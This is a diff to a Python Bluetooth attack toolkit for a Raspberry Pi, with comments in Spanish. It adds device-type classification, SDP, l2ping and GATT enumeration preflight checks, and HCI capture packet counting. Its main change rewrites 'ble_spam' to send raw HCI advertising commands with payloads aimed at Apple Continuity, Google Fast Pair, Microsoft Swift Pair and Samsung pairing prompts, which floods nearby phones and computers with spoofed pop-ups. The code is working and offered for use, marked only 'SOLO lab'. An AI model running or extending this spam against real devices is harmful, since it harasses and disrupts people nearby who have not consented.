@@ -121,6 +121,107 @@ def _resolve_vendors(prefixes):
     return result
 
 
+def _device_type(icon, cls, appearance, vendor, name=""):
+    """Mapea icon/CoD/Appearance/vendor/name a una etiqueta corta del tipo
+    de dispositivo (PC, Celular, Audio, Teclado, Mouse, TV, Reloj, ...).
+    Nunca lanza; devuelve '?' si no hay pista suficiente."""
+    ic = (icon or "").lower().strip()
+    # 1) Bluez ya decidió por nosotros via `Icon:` -> es la pista más fiable.
+    if ic:
+        if "computer" in ic:         return "PC"
+        if ic == "phone":            return "Celular"
+        if ic.startswith("audio"):   return "Audio"
+        if ic == "video-display":    return "TV"
+        if ic.startswith("camera"):  return "Camara"
+        if ic == "printer":          return "Impresora"
+        if "keyboard" in ic:         return "Teclado"
+        if "mouse" in ic:            return "Mouse"
+        if "gaming" in ic:           return "Gamepad"
+        if "tablet" in ic:           return "Tablet"
+        if "watch" in ic:            return "Reloj"
+        if "network" in ic:          return "Red"
+    # 2) Class of Device (BR/EDR). Formato "0x002a010c".
+    try:
+        c = int(cls, 16) if isinstance(cls, str) else int(cls or 0)
+    except Exception:
+        c = 0
+    if c:
+        major = (c >> 8) & 0x1F
+        minor = (c >> 2) & 0x3F
+        if major == 1:
+            return {1:"Desktop",2:"Server",3:"Laptop",4:"PDA",5:"PDA",6:"Wearable"}.get(minor, "PC")
+        if major == 2:
+            return {1:"Celular",2:"Cordless",3:"Celular",4:"Modem",5:"ISDN"}.get(minor, "Celular")
+        if major == 3: return "Red"
+        if major == 4:
+            audio_map = {1:"Headset",2:"Hands-free",4:"Microfono",5:"Parlante",
+                         6:"Audifonos",7:"Audio",8:"Auto",9:"Set-top",
+                         10:"HiFi",11:"VCR",12:"Camara",13:"Camcorder",
+                         14:"Monitor",15:"TV",16:"Videoconf",18:"Gamepad"}
+            return audio_map.get(minor, "Audio")
+        if major == 5:
+            if c & 0x40: return "Teclado"
+            if c & 0x20: return "Mouse"
+            return {1:"Joystick",2:"Gamepad",3:"Remote",4:"Sensor",
+                    5:"Tablet",6:"Lector"}.get(minor, "Perif.")
+        if major == 6:
+            return "Impresora" if minor & 0x20 else "Imagen"
+        if major == 7:
+            return {1:"Reloj",2:"Pager",3:"Ropa",4:"Casco",5:"Gafas"}.get(minor, "Wearable")
+        if major == 8: return "Juguete"
+        if major == 9: return "Salud"
+    # 3) Appearance BLE: puede venir como "Generic Watch (0x00C0)" o "0x00C0".
+    try:
+        ap = 0
+        if appearance:
+            m = re.search(r'0x([0-9A-Fa-f]+)', str(appearance))
+            if m: ap = int(m.group(1), 16)
+    except Exception:
+        ap = 0
+    if ap:
+        cat = ap >> 6  # 10-bit category
+        if cat == 1: return "Celular"
+        if cat == 2: return "PC"
+        if cat in (3, 4): return "Reloj"
+        if cat == 5: return "Reloj"
+        if cat == 6: return "Pantalla"
+        if cat == 7: return "Control"
+        if cat == 8: return "Gafas"
+        if cat == 10: return "Llavero"
+        if cat == 11: return "Media"
+        if cat in (12, 13): return "Scanner"
+        if cat == 15: return "HID"
+        if cat >> 4 == 0x0F:  # HID subrange 0x03C0-0x03FF
+            sub = ap & 0x3F
+            return {1:"Teclado",2:"Mouse",3:"Joystick",4:"Gamepad",
+                    5:"Tablet",6:"Lector",7:"Pluma",8:"Scanner"}.get(sub, "HID")
+    # 4) Appearance textual (si viene como "Generic Watch")
+    aps = (appearance or "").lower()
+    if "watch" in aps: return "Reloj"
+    if "phone" in aps: return "Celular"
+    if "keyboard" in aps: return "Teclado"
+    if "mouse" in aps: return "Mouse"
+    if "computer" in aps: return "PC"
+    # 5) Heuristica muy debil por vendor+name
+    v = (vendor or "").lower()
+    n = (name or "").lower()
+    if any(x in v for x in ("samsung","xiaomi","huawei","oneplus","motorola","oppo","realme")):
+        return "Celular?"
+    if any(x in v for x in ("jbl","harman","bose","sony corporation","beats")):
+        return "Audio?"
+    if any(x in v for x in ("hewlett","hp inc","canon","epson","brother")):
+        return "Impr.?"
+    if any(x in n for x in ("airpods","buds","headphone","headset","speaker","soundbar","flip","charge")):
+        return "Audio?"
+    if any(x in n for x in ("laptop","macbook","desktop","workstation")):
+        return "PC?"
+    if any(x in n for x in ("iphone","galaxy","pixel","phone")):
+        return "Celular?"
+    if any(x in n for x in ("tv ","chromecast","shield","fire tv","roku")):
+        return "TV?"
+    return "?"
+
+
 def _vendor_for(mac):
     """Devuelve el fabricante por OUI o una etiqueta especial para MAC
     aleatorias. '' si no se puede resolver."""
@@ -640,6 +741,9 @@ def scan(iface=DEFAULT_IFACE, seconds=10, mode='dual'):
     devices = list(by_mac.values())
     for d in devices:
         d["vendor"] = _vendor_for(d["mac"])
+        d["type"] = _device_type(d.get("icon",""), d.get("class",""),
+                                 d.get("appearance",""), d.get("vendor",""),
+                                 d.get("name",""))
 
     # Log en DB (best-effort; nunca tumba el scan).
     log_bluetooth_batch(iface, mode, devices)
@@ -690,6 +794,7 @@ def log_bluetooth_batch(iface, mode, devices):
                 appearance=(d.get("appearance") or None),
                 cls=(d.get("class") or None),
                 icon=(d.get("icon") or None),
+                type_label=(d.get("type") or None),
                 services=svc or uuids_str or None,
                 manufacturer_data=(d.get("manufacturer_data")
                                    or d.get("manufacturer_key") or None),
@@ -763,13 +868,39 @@ def parse_sdptool_browse(text):
     return services
 
 
+def _quick_info(mac):
+    """`bluetoothctl info <mac>` rapido (sin cambiar discovery). Devuelve
+    dict con addr_type/name/paired/connected o None si no responde."""
+    r = _run([BLUETOOTHCTL, 'info', mac], timeout=4)
+    if not r or not r.stdout:
+        return None
+    return parse_bluetoothctl_info(r.stdout)
+
+
+def _is_ble_only(info):
+    """Heuristica: si el peer tiene addr_type 'random' es BLE puro. Las
+    MAC con bit 0x02 del 1er octeto tambien son locally administered -> BLE."""
+    if info and (info.get("addr_type") or "").lower() == "random":
+        return True
+    return False
+
+
 def sdp_browse(mac, timeout=15):
     """Enumera servicios BR/EDR del target via SDP (sin pairing). Util para
     identificar perfil (A2DP/HFP/HID/OBEX...) y evaluar superficie de ataque.
-    Nota: solo funciona con dispositivos BR/EDR; muchos LE-only responden vacio."""
+    Solo aplica a BR/EDR classic; para LE puro usa GATT."""
     mac = (mac or '').strip().upper()
     if not re.fullmatch(r'[0-9A-F:]{17}', mac):
         return None, "MAC invalida"
+
+    # Preflight: si es BLE puro, decimos claro que SDP no aplica (en vez de
+    # dejar que sdptool devuelva 'Host is down' confuso).
+    info = _quick_info(mac)
+    if _is_ble_only(info) or _mac_is_random(mac):
+        err = "SDP no aplica: este device es BLE (addr random). Usa GATT."
+        log_bt_attack("sdp_browse", mac, "n_a", details=err)
+        return {"services": [], "raw": ""}, err
+
     r = _run([SUDO, '-n', SDPTOOL, 'browse', mac], timeout=timeout)
     text = ""
     if r:
@@ -874,22 +1005,35 @@ def gatt_enum(mac, iface=DEFAULT_IFACE, timeout=30):
         proc.stdin.write(f"select {bd}\n")
         proc.stdin.write(f"connect {mac}\n")
         proc.stdin.flush()
-        # Esperamos a Connected: yes o fallo (hasta 10s)
+        # Esperamos a Connected: yes o fallo (hasta 15s; devices lentos como
+        # IoT barato pueden tardar 10s+ en completar el GATT discovery inicial).
         t0 = time.time()
         connected = False
-        while time.time() - t0 < 10:
-            if any('Connected: yes' in l for l in lines):
+        while time.time() - t0 < 15:
+            full = ''.join(lines)
+            if 'Connected: yes' in full or 'ServicesResolved: yes' in full:
                 connected = True; break
-            if any('Failed to connect' in l or 'org.bluez.Error' in l for l in lines):
-                err = "connect fallo"; break
+            if 'Failed to connect' in full:
+                # Causa clara segun el mensaje tipico de bluez:
+                if 'le-connection-abort-by-local' in full:
+                    err = "connect fallo (device rechazo). Puede requerir pairing."
+                elif 'br-connection-page-timeout' in full:
+                    err = "connect fallo (page timeout). BR/EDR fuera de alcance o apagado."
+                elif 'not available' in full:
+                    err = "connect fallo (adapter busy). Reintenta."
+                else:
+                    err = "connect fallo (device no acepta conexion sin pairing)."
+                break
+            if 'org.bluez.Error' in full:
+                err = "connect fallo (bluez error; ver action_log)"; break
             time.sleep(0.3)
         if connected:
-            # Dar tiempo al GATT discovery
-            time.sleep(3)
+            # Dar tiempo al GATT discovery (puede tardar en IoT lentos)
+            time.sleep(4)
             proc.stdin.write("menu gatt\n")
             proc.stdin.write("list-attributes\n")
             proc.stdin.flush()
-            time.sleep(2)
+            time.sleep(3)
             proc.stdin.write("back\n")
             proc.stdin.write(f"disconnect {mac}\n")
             proc.stdin.flush()
@@ -958,11 +1102,21 @@ def parse_l2ping_output(text):
 
 def l2ping(mac, count=5, size=44, timeout=20):
     """L2CAP ping (BR/EDR). Prueba de alcance/latencia y stress leve. SOLO
-    funciona con BR/EDR classic; BLE-only responde 'Host is down' u otro error.
+    funciona con BR/EDR classic; para BLE puro no aplica.
     SOLO lab."""
     mac = (mac or '').strip().upper()
     if not re.fullmatch(r'[0-9A-F:]{17}', mac):
         return None, "MAC invalida"
+
+    # Preflight como SDP: si es BLE puro, L2CAP ping no aplica.
+    info = _quick_info(mac)
+    if _is_ble_only(info) or _mac_is_random(mac):
+        err = "L2ping no aplica: device BLE (addr random). Usa GATT."
+        empty = {"sent": 0, "received": 0, "loss_pct": None,
+                 "avg_ms": None, "min_ms": None, "max_ms": None, "samples": []}
+        log_bt_attack("l2ping", mac, "n_a", details=err)
+        return {"stats": empty, "raw": ""}, err
+
     count = max(1, min(int(count or 5), 50))
     size = max(1, min(int(size or 44), 600))
     r = _run([SUDO, '-n', L2PING, '-c', str(count), '-s', str(size), mac],
@@ -1013,100 +1167,166 @@ def _load_ble_names():
     return names
 
 
-def ble_spam(iface=DEFAULT_IFACE, seconds=20, mode="names", period_s=1.5):
-    """Rota el nombre advertising del controller cada `period_s` segundos
-    durante `seconds`. SOLO lab / permiso explicito.
+def _hci(iface, ocf, data_bytes, timeout=3):
+    """Envia un HCI command raw del grupo LE (OGF=0x08) via `hcitool`.
+    Preferido a bluetoothctl advertise porque LeAdvertisingManager1 del bluez
+    falla con 'org.bluez.Error.Failed' en los chips comunes de la Pi
+    (BCM43438 onboard y RTL8821CU USB) al registrar advertisements."""
+    cmd = [SUDO, '-n', HCITOOL, '-i', iface, 'cmd',
+           '0x08', '0x%04x' % ocf]
+    for b in data_bytes:
+        cmd.append('%02x' % (b & 0xFF))
+    return _run(cmd, timeout=timeout)
 
-    mode="names": elige nombres de data/ble_names.txt.
-    mode="random": nombres aleatorios cortos (ej. 'Dev-ab12').
 
-    bluez permite UN solo advertisement activo por controller a la vez; por
-    eso en vez de registrar varios en paralelo, rotamos el nombre y
-    reactivamos. Flow (bluetoothctl interactivo):
-      select <bd> + menu advertise + set-name <X> + on
-      sleep period_s
-      off + set-name <Y> + on
-      ...
-    """
+def _load_payloads(kind):
+    """Lee data/ble_payloads/<kind>.txt. Cada linea:
+       name=<str>|cid=<4-hex>|data=<hex-pairs>
+    `cid` y `data` opcionales. Retorna lista de dicts."""
+    paths = (
+        os.path.expanduser(f"~/piscanlvgl/data/ble_payloads/{kind}.txt"),
+        os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                     "..", "..", "data", "ble_payloads", f"{kind}.txt"),
+    )
+    items = []
+    for p in paths:
+        if not os.path.exists(p):
+            continue
+        try:
+            with open(p, "r", errors="replace") as f:
+                for raw in f:
+                    s = raw.strip()
+                    if not s or s.startswith("#"):
+                        continue
+                    d = {"name": "", "cid": None, "data": b''}
+                    for part in s.split("|"):
+                        part = part.strip()
+                        if part.startswith("name="):
+                            d["name"] = part[5:].strip()[:24]
+                        elif part.startswith("cid="):
+                            try:
+                                d["cid"] = int(part[4:].strip(), 16)
+                            except Exception:
+                                pass
+                        elif part.startswith("data="):
+                            try:
+                                hx = re.sub(r'\s+', '', part[5:])
+                                d["data"] = bytes.fromhex(hx)[:20]
+                            except Exception:
+                                pass
+                    if d["name"] or d["cid"] is not None:
+                        items.append(d)
+            if items:
+                break
+        except Exception:
+            pass
+    return items
+
+
+def _build_adv_payload(item, max_len=31):
+    """Construye el AD payload (<=31 bytes legacy) con AD Flags + opcional
+    Manufacturer Specific Data + opcional Complete Local Name."""
+    out = bytearray()
+    # AD Flags: General Discoverable + BR/EDR Not Supported.
+    out += bytes([0x02, 0x01, 0x06])
+    cid = item.get("cid") if item else None
+    data = item.get("data") or b'' if item else b''
+    name = (item.get("name") or '').encode('utf-8', errors='ignore') if item else b''
+
+    if cid is not None:
+        md = bytes([cid & 0xFF, (cid >> 8) & 0xFF]) + bytes(data)
+        if len(out) + 2 + len(md) <= max_len:
+            out += bytes([1 + len(md), 0xFF]) + md
+    if name:
+        remain = max_len - len(out) - 2
+        if remain > 0:
+            adv_type = 0x09  # Complete Local Name
+            if len(name) > remain:
+                name = name[:remain]
+                adv_type = 0x08  # Shortened Local Name
+            out += bytes([1 + len(name), adv_type]) + name
+    return bytes(out[:max_len])
+
+
+def ble_spam(iface=DEFAULT_IFACE, seconds=20, mode="names", period_s=1.0):
+    """BLE spam via HCI raw commands (hcitool). Rotamos LE Set Advertising
+    Data cada `period_s` segundos durante `seconds`.
+
+    mode:
+      names   - rota nombres de data/ble_names.txt
+      random  - "Dev-xxxx" aleatorios
+      apple   - data/ble_payloads/apple.txt   (Apple Continuity -> iOS/macOS)
+      google  - data/ble_payloads/google.txt  (Google Fast Pair/Nearby -> Android)
+      microsoft - .../microsoft.txt           (Swift Pair -> Windows 10/11)
+      samsung - .../samsung.txt               (Buds Live-like -> Samsung)
+
+    Usamos hcitool HCI raw porque bluez `LeAdvertisingManager1` falla con
+    'org.bluez.Error.Failed' en los chips comunes de la Pi (confirmado el
+    2026-10-29 con BCM43438 onboard y RTL8821CU USB). hcitool va directo al
+    kernel por mgmt sock. SOLO lab."""
     try:
         _iface_index(iface)
     except ValueError as e:
         return None, str(e)
     seconds = max(2, min(int(seconds or 20), 300))
-    period = max(0.4, float(period_s))
+    period = max(0.3, float(period_s))
     mode = (mode or "names").lower()
 
     ok, msg = power_on(iface)
     if not ok:
         return None, f"No se pudo encender {iface}: {msg}"
-    bd = _bd_address(iface)
-    if not bd:
-        return None, f"No se pudo obtener BD de {iface}"
 
-    names_pool = _load_ble_names() if mode == "names" else []
+    # LE Set Advertise Enable OFF (limpia estado previo)
+    r = _hci(iface, 0x000A, [0x00])
+    if r is None or r.returncode != 0:
+        return None, "hcitool: no se pudo hablar con el controller (sudoers?)"
+    time.sleep(0.1)
+    # LE Set Advertising Parameters: interval 100ms, non-connectable, 3 ch.
+    _hci(iface, 0x0006, [0xA0, 0x00, 0xA0, 0x00, 0x03, 0x00, 0x00,
+                         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00])
 
-    def _gen_name():
-        if mode == "names" and names_pool:
-            return random.choice(names_pool)
-        return "Dev-%04x" % random.randint(0, 0xFFFF)
+    # Pool de payloads segun modo.
+    if mode in ("apple", "google", "microsoft", "samsung"):
+        pool = _load_payloads(mode)
+        if not pool:
+            # Fallback a names si falta el archivo.
+            pool = [{"name": n, "cid": None, "data": b''}
+                    for n in _load_ble_names()]
+            mode = f"{mode}(fallback=names)"
+    elif mode == "random":
+        pool = [{"name": "Dev-%04x" % random.randint(0, 0xFFFF),
+                 "cid": None, "data": b''} for _ in range(32)]
+    else:
+        pool = [{"name": n, "cid": None, "data": b''}
+                for n in _load_ble_names()]
 
-    proc = subprocess.Popen(
-        [BLUETOOTHCTL],
-        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT, text=True, bufsize=1,
-    )
-    lines = []
-    stop = threading.Event()
-    def _rd():
-        try:
-            for line in iter(proc.stdout.readline, ''):
-                if stop.is_set(): break
-                lines.append(line)
-        except Exception:
-            pass
-    t = threading.Thread(target=_rd, daemon=True); t.start()
+    cycles = 0
+    uniq_names = set()
+    last_name = ""
+    t_end = time.time() + seconds
+    while time.time() < t_end:
+        item = random.choice(pool)
+        payload = _build_adv_payload(item)
+        if not payload:
+            continue
+        padded = payload + bytes(31 - len(payload))
+        _hci(iface, 0x0008, [len(payload)] + list(padded))
+        _hci(iface, 0x000A, [0x01])
+        cycles += 1
+        n = item.get("name", "")
+        if n:
+            uniq_names.add(n); last_name = n
+        time.sleep(period)
 
-    used = []
-    try:
-        proc.stdin.write(f"select {bd}\n")
-        proc.stdin.write("menu advertise\n")
-        proc.stdin.flush()
-        time.sleep(0.3)
+    # Teardown
+    _hci(iface, 0x000A, [0x00])
 
-        t_end = time.time() + seconds
-        while time.time() < t_end:
-            name = _gen_name()
-            used.append(name)
-            # off+on para no chocar con "already registered"
-            proc.stdin.write("off\n")
-            proc.stdin.write(f"set-name {name}\n")
-            proc.stdin.write("on\n")
-            proc.stdin.flush()
-            time.sleep(period)
-
-        # Teardown
-        proc.stdin.write("off\n")
-        proc.stdin.write("back\n")
-        proc.stdin.write("quit\n")
-        proc.stdin.flush()
-        try: proc.wait(timeout=5)
-        except subprocess.TimeoutExpired: proc.kill()
-    except Exception as e:
-        try: proc.kill()
-        except Exception: pass
-        stop.set(); t.join(timeout=1)
-        return None, f"bluetoothctl advertise fallo: {e}"
-
-    stop.set(); t.join(timeout=1)
-    out = ''.join(lines)
-    cycles = len(used)
-    uniq = len(set(used))
-    log_bt_attack("ble_spam", bd, "ok" if cycles > 0 else "fail",
+    log_bt_attack("ble_spam", "", "ok" if cycles > 0 else "fail",
                   details=f"iface={iface} mode={mode} seconds={seconds} "
-                          f"cycles={cycles} uniq_names={uniq}")
+                          f"cycles={cycles} uniq={len(uniq_names)} last={last_name}")
     return {"iface": iface, "mode": mode, "seconds": seconds,
-            "cycles": cycles, "uniq_names": uniq, "last_name": used[-1] if used else "",
-            "raw": out[-800:]}, None
+            "cycles": cycles, "uniq_names": len(uniq_names),
+            "last_name": last_name, "raw": ""}, None
 
 
 # ---------------------------------------------------------------------------
@@ -1122,11 +1342,38 @@ def _capture_dir():
     return d
 
 
+def _btsnoop_count_packets(path):
+    """Cuenta registros HCI en un archivo .btsnoop (header 16B + por record:
+    orig(4) incl(4) flags(4) drops(4) ts(8) + data). None si no es btsnoop."""
+    import struct
+    try:
+        with open(path, 'rb') as f:
+            header = f.read(16)
+            if len(header) < 16 or header[:8] != b'btsnoop\x00':
+                return None
+            count = 0
+            while True:
+                rec = f.read(24)
+                if len(rec) < 24:
+                    break
+                _, incl, _, _, _ = struct.unpack('>IIIIQ', rec)
+                if incl > (1 << 20):
+                    break  # proteccion ante corrupcion
+                data = f.read(incl)
+                if len(data) < incl:
+                    break
+                count += 1
+            return count
+    except Exception:
+        return None
+
+
 def btmon_capture(iface=DEFAULT_IFACE, seconds=30):
     """Captura HCI con `btmon` a archivo. Formato btsnoop (abierto por
-    Wireshark/btmon --read). SOLO lab. Devuelve path + size + duration real."""
+    Wireshark/btmon --read). SOLO lab. Devuelve path + size + duration real
+    + packet_count (parseando el header btsnoop)."""
     try:
-        idx = _iface_index(iface)
+        _iface_index(iface)
     except ValueError as e:
         return None, str(e)
     seconds = max(2, min(int(seconds or 30), 600))
@@ -1152,16 +1399,20 @@ def btmon_capture(iface=DEFAULT_IFACE, seconds=30):
     except Exception:
         pass
 
+    packets = _btsnoop_count_packets(path) if size > 0 else None
+
     err = None
     if size == 0:
         err = (text.strip() or "btmon no genero archivo (ver permisos)")[-200:]
 
     result = "ok" if size > 0 else "fail"
     log_bt_attack("capture", "", result,
-                  details=f"iface={iface} path={path} size={size}B dur={dur}s" +
-                          (f" err={err}" if err else ""))
+                  details=f"iface={iface} path={path} size={size}B "
+                          f"packets={packets if packets is not None else '?'} "
+                          f"dur={dur}s" + (f" err={err}" if err else ""))
     return {"iface": iface, "path": path, "size": size,
-            "duration_s": dur, "raw": text[-400:]}, err
+            "duration_s": dur, "packets": packets,
+            "raw": text[-400:]}, err
 
 
 # ---------------------------------------------------------------------------
